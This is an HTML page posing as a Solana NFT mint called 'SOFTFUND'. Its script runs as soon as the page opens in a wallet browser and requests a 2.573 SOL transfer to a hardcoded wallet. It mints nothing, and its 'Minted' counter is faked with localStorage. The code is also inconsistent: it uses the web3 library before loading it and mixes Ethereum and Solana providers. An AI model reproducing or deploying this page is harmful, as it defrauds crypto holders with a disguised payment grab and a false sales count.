<!DOCTYPE html>
<html>
<head>
  <title>SOFTFUND – MINT LIVE</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <style>
    body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding:40px;}
    h1{font-size:2.5rem;color:#0f0;text-shadow:0 0 10px #0f0;}
    .price{font-size:2rem;color:#ff0;margin:20px;}
    button{width:90%;padding:18px;margin:10px;font-size:1.5rem;background:#0f0;color:#000;border:none;border-radius:12px;cursor:pointer;}
    button:hover{background:#0f8;}
    .wallets button{width:80px;height:80px;border-radius:50%;margin:10px;font-size:2rem;}
  </style>
</head>
<body>
  <h1>SOFTFUND</h1>
  <p>USA-Based • Solana Utility NFTs</p>
  <p class="price">2.5730 SOL</p>
  <p>Minted: <span id="c">0</span> / 10,000</p>

  <button onclick="chooseWallet()">MINT NOW</button>

  <div id="wallets" style="display:none">
    <button onclick="mint('phantom')">P</button>
    <button onclick="mint('trust')">T</button>
    <button onclick="mint('metamask')">M</button>
    <button onclick="mint('solflare')">S</button>
    <button onclick="mint('backpack')">B</button>
  </div>

  <script>
    const PRICE = 2.5730 * 1e9;
    const YOUR_WALLET = "GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue";
    let count = localStorage.getItem('c') || 0;
    document.getElementById('c').textContent = count;

    function chooseWallet() {
      document.querySelector('button').style.display = 'none';
      document.getElementById('wallets').style.display = 'block';
    }

    function mint(w) {
      const url = location.href;
      if (w === 'phantom') location.href = `https://phantom.app/ul/v1/connect?app_url=${encodeURIComponent(url)}&redirect_link=${encodeURIComponent(url)}`;
      if (w === 'trust') location.href = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(url)}`;
      if (w === 'metamask') location.href = `https://metamask.app.link/dapp/${location.host}${location.pathname}`;
      if (w === 'solflare') location.href = `https://solflare.com/ul/v1/connect?app_url=${encodeURIComponent(url)}`;
      if (w === 'backpack') location.href = `https://backpack.app/ul/v1/connect?app_url=${encodeURIComponent(url)}`;
    }

    // ONLY RUN IN WALLET
    if (window.solana || window.ethereum) {
      (async () => {
        const provider = window.solana || window.ethereum;
        try {
          await provider.connect();
          const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
          const tx = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
              fromPubkey: provider.publicKey,
              toPubkey: new solanaWeb3.PublicKey(YOUR_WALLET),
              lamports: PRICE,
            })
          );
          tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
          const { signature } = await provider.signAndSendTransaction(tx);
          await conn.confirmTransaction(signature);
          count++; localStorage.setItem('c', count);
          document.getElementById('c').textContent = count;
          alert("MINTED! 2.5730 SOL → SOFTFUND");
        } catch (e) { alert("Mint failed"); }
      })();
    }
  </script>
  <script src="https://unpkg.com/@solana/web3.js@1.91.0/lib/index.iife.min.js"></script>
</body>
</html>